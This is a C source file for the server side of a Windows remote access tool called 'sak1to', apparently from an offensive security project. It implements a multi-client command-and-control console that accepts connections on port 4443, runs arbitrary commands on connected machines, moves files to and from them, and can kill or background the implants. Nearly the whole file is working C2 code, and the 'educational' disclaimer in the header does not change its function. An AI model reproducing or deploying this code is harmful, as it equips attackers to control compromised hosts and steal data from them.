/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/
#include <WS2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include "sakito_core.h"
#include "sakito_server_tools.h"

#define PORT 4443
#define MEM_CHUNK 5

#pragma comment(lib, "ws2_32.lib")

void host_chdir(Server_map *s_map) {
	if (chdir(s_map->buf+3) == FAILURE) {
		switch (errno) {
			case ENOENT:
				printf("%s: No such file or directory\n", s_map->buf+3);
				break;
			case EACCES:
				puts("Permission denied.");
				break;
		}
	}
}

// Function to close specified socket.
void terminate_server(SOCKET socket, const char* const error) {
	int err_code = EXIT_SUCCESS;
	if (error) {
		fprintf(stderr, "%s: ld\n", error, WSAGetLastError());
		err_code = 1;
	}

	closesocket(socket);
	WSACleanup();
	exit(err_code);
}

void terminate_console(Server_map* s_map) {
	// Quit accepting connections.
	TerminateThread(s_map->acp_thread, 0);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) {
		for (size_t i = 0; i < s_map->clients_sz; i++)
			closesocket(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	// Stop accepting connections.
	terminate_server(s_map->listen_socket, NULL);
}

// Function to create socket.
const SOCKET create_socket() {
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) {
		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	int optval = 1;
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) != 0)
		terminate_server(listen_socket, "Error setting socket options");

	return listen_socket;
}

// Function to bind socket to specified port.
void bind_socket(const SOCKET listen_socket) {
	// Create sockaddr_in structure.
	struct sockaddr_in sin;

	// Assign member values.
	sin.sin_family = AF_INET;
	sin.sin_port = htons(PORT);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;

	// Bind ip address and port to listen_socket.
	if (bind(listen_socket, (struct sockaddr*)&sin, sizeof(sin)) != 0)
		terminate_server(listen_socket, "Socket bind failed with error");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
}

void add_client(Server_map* s_map, char* const host, SOCKET client_socket) {
	// If delete_client() is executing: wait for it to finish modifying s_map->clients to prevent race conditions from occurring.
	WaitForSingleObject(s_map->ghMutex, INFINITE);

	if (s_map->clients_sz == s_map->clients_alloc)
		s_map->clients = realloc(s_map->clients, (s_map->clients_alloc += MEM_CHUNK) * sizeof(Conn));

	// Add hostname string and client_socket object to Conn structure.
	s_map->clients[s_map->clients_sz].host = host;
	s_map->clients[s_map->clients_sz].sock = client_socket;
	s_map->clients_sz++;

	// Release our mutex now.
	ReleaseMutex(s_map->ghMutex);
}

// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) {
	// Assign member values to connection map object/structure.
	Server_map* s_map = (Server_map*)lp_param;
	s_map->clients_alloc = MEM_CHUNK;
	s_map->clients_sz = 0;
	s_map->clients = malloc(s_map->clients_alloc * sizeof(Conn));
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	while (1) {
		struct sockaddr_in client;
		int c_size = sizeof(client);

		// Client socket object.
		const SOCKET client_socket = accept(s_map->listen_socket, (struct sockaddr*)&client, &c_size);
		if (client_socket == INVALID_SOCKET)
			terminate_server(s_map->listen_socket, "Error accepting client connection");

		// Client's remote name and port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (getnameinfo((struct sockaddr*)&client, c_size, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}

		// Add client oriented data to s_map object.
		add_client(s_map, host, client_socket);
	}

	return FAILURE;
}

// Wrapper function for sending file to client (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// Open file with read permissions.
	HANDLE h_file = sakito_win_openf(buf+8, GENERIC_READ, OPEN_EXISTING);

	// If file doesn't exist.
	if (h_file == INVALID_HANDLE_VALUE) {
		puts("File not found or permission denied.\n");

		// Send '6' control code to client to force client to re-receive command.
		if (send(client_socket, "6", 1, 0) < 1)
			return SOCKET_ERROR;

		return FILE_NOT_FOUND;
	}

	// '3' is the command code for uploading a file from the client's filesystem.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (send(client_socket, buf+7, cmd_len, 0) < 1)
		return SOCKET_ERROR;

	// Receive file transfer start byte to prevent received data from overlapping.
	if (recv(client_socket, buf, 1, 0) < 1)
		return SOCKET_ERROR;

	int32_t f_size = 0;

	// Get file size and serialize file size bytes.
	LARGE_INTEGER largeint_struct;
	GetFileSizeEx(h_file, &largeint_struct);
	f_size = (int32_t)largeint_struct.QuadPart;

	// Windows TCP file transfer (receive) function located in sakito_core.h.
	return sakito_win_sendf(h_file, client_socket, buf, f_size);
}

// Function to receive file from client (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '4' is the command code for downloading a file from the client's file-system.
	buf[9] = '4';

	// Send command code + filename to be parsed.
	if (send(client_socket, buf+9, cmd_len, 0) < 1)
		return SOCKET_ERROR;

	// Receive serialized file size int32_t bytes.
	if (recv(client_socket, buf, sizeof(int32_t), 0) < 1)
		return SOCKET_ERROR;

	// Deserialize f_size.
	int32_t f_size = ntohl_conv(&*(buf));

	int i_result = SUCCESS;

	// If the file exists:
	if (f_size != FAILURE) {
		// Open the file.
		HANDLE h_file = sakito_win_openf(buf+10, GENERIC_WRITE, CREATE_ALWAYS);
		// If the file contains bytes.
		if (f_size > 0)
			// Windows TCP file transfer (recv) function located in sakito_core.h.
			i_result = sakito_win_recvf(h_file, client_socket, buf, f_size);
		if (h_file != INVALID_HANDLE_VALUE)
			// Close the file.
			CloseHandle(h_file);
	}
	else {
		puts("The client's system cannot find the file specified.\n");
	}

	// Send file transfer complete byte.
	if (send(client_socket, FTRANSFER_FINISHED, 1, 0) < 1)
		return FAILURE;

	return i_result;
}

// Function send change directory command to client.
int client_chdir(char* const buf, const size_t cmd_len, SOCKET client_socket) {
	// '1' is the command code for changing directory.
	buf[3] = '1';
	
	// Send command code + directory string to be parsed.
	if (send(client_socket, buf+3, BUFLEN, 0) < 1)
		return FAILURE;

	// Receive _chdir() result.
	if (recv(client_socket, buf, 1, 0) < 1)
		return FAILURE;

	if (buf[0] == '0')
		puts("The client's system cannot find the path specified.\n");
 
	return SUCCESS;
}

// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '2' is the command code for terminating/killing the process on the client.
	send(client_socket, "2", cmd_len, 0);

	return EXIT_SUCCESS;
}

// Function to terminate/kill client.
int background_client(char* const buf, const size_t cmd_len, SOCKET client_socket) {
	// '5' is the command code for backgrounding the client.
	if (send(client_socket, "5", 1, 0) < 1)
		return SOCKET_ERROR;

	return BACKGROUND_CLIENT;
}

// Function to send command to client.
int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '0' Is the command code for executing a command using CreateProcess via the client.
	buf[0] = '0';

	// Send command to server.
	if (send(client_socket, buf, cmd_len, 0) < 1)
		return FAILURE;

	// Initialize i_result to true.
	int i_result = SUCCESS;

	// Receive command output stream and write output chunks to stdout.
	HANDLE s_out = GetStdHandle(STD_OUTPUT_HANDLE);
	do {
		i_result = recv(client_socket, buf, BUFLEN, 0);
		if (buf[0] == EOS[0])
			break;
		WriteFile(s_out, buf, i_result, NULL, NULL);
	} while (i_result > 0);

	// write a single newline to stdout for cmd line output alignment.
	fputc('\n', stdout);

	return i_result;
}

// Function to resize s_map array/remove and close connection.
void delete_client(Server_map* s_map, const int client_id) {
	// If accept_conns() is executing: wait for it to finish modifying s_map->clients to prevent race conditions from occurring.
	WaitForSingleObject(s_map->ghMutex, INFINITE);

	if (s_map->clients[client_id].sock)
		closesocket(s_map->clients[client_id].sock);

	// If there's more than one connection: resize the clients structure member values.
	if (s_map->clients_sz > 1) {
		int max_index = s_map->clients_sz-1;
		for (size_t i = client_id; i < max_index; i++) {
			s_map->clients[i].sock = s_map->clients[i + 1].sock;
			s_map->clients[i].host = s_map->clients[i + 1].host;
		}
		s_map->clients[max_index].sock = 0;
		s_map->clients[max_index].host = NULL;
	}

	s_map->clients_sz--;

	// Release our mutex now - so accept_conns() can continue execution.
	ReleaseMutex(s_map->ghMutex);

	printf("Client: \"%s\" disconnected.\n\n", s_map->clients[client_id].host);
}

int validate_id(Server_map* s_map) {
	int client_id;
	client_id = atoi(s_map->buf+9);

	if (!s_map->clients_sz || client_id < 0 || client_id > s_map->clients_sz - 1)
		return FAILURE;
	else
		return client_id;
}

// Function to parse interactive input and send to specified client.
void interact(Server_map* s_map) {
	int client_id = validate_id(s_map);

	if (client_id == FAILURE) {
		puts("Invalid client identifier.");
		return;
	}

	// Send initialization byte to client.
	int i_result = send(s_map->clients[client_id].sock, INIT_CONN, 1, 0);

	// Receive and parse input/send commands to client.
	while (i_result > 0) {
		// Receive current working directory.
		if (recv(s_map->clients[client_id].sock, s_map->buf, BUFLEN, 0) < 1)
			break;

		printf("%d-(%s)-%s>", client_id, s_map->clients[client_id].host, s_map->buf);
	
		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);

		// Array of command strings to parse stdin with.
		const char commands[5][11] = { "cd ", "exit", "upload ", "download ", "background" };

		// Function pointer array of each c2 command.
		void* func_array[5] = { &client_chdir, &terminate_client, &send_file, &recv_file, &background_client};

		// Parse and execute command function.
		size_t cmd_len = 0;
		const server_func target_func = (const server_func)parse_cmd(s_map->buf+1,
									&cmd_len,
									5,
									commands,
									func_array,
									&send_cmd);

		// Call target function.
		i_result = target_func(s_map->buf, cmd_len+1, s_map->clients[client_id].sock);

		if (i_result == BACKGROUND)
			return;
	}

	// If client disconnected/exit command is parsed: delete the connection.
	delete_client(s_map, client_id);
}

void exec_cmd(Server_map* s_map) {
	sakito_win_cp((SOCKET)NULL, s_map->buf);
	fputc('\n', stdout);
}

void sakito_console(Server_map* s_map) {
	// Saktio console loop.
	while (1) {
		GetCurrentDirectory(BUFLEN, s_map->buf);
		printf("sak1to-console-(%s>", s_map->buf);

		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);


		// Array of command strings to parse stdin with.
		const char commands[4][11] = { "cd ", "exit", "list", "interact " };

		// Function pointer array of each c2 command.
		void* func_array[4] = { &host_chdir, &terminate_console, &list_connections, &interact};

		// Parse and execute command function.
		size_t cmd_len = 0;
		const console_func target_func = (const console_func)parse_cmd(s_map->buf,
									 &cmd_len,
									 4,
									 commands,
									 func_array,
									 &exec_cmd);

		// Call target function.
		target_func(s_map);
	}
}

// Main function for parsing console input and calling sakito-console functions.
int main(void) {
	// Instantiate a Server_map structure.
	Server_map s_map;

	// Mutex lock for preventing race conditions.
	s_map.ghMutex = CreateMutex(NULL, FALSE, NULL);

	// Begin accepting connections.
	s_map.acp_thread = CreateThread(0, 0, accept_conns, &s_map, 0, 0);

	// Initiate sakito console.
	sakito_console(&s_map);

	return FAILURE;
}
